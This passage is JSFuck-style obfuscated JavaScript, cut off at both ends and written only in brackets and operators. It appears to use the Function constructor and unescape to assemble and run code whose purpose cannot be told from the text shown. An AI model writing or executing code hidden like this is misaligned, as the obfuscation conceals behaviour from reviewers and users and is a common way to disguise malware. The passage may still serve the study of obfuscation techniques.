]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+{}+[])[+!![]]+(+[]+[])+([]+{})[!+[]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+[]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!!